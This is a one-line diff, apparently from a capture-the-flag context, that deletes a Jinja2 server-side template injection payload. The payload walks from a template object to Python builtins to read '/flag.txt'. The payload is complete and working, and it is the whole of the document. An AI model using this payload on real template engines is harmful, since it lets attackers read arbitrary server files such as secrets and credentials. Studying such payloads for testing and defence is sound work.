@@ -1,1 +1,0 @@
-{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }} 
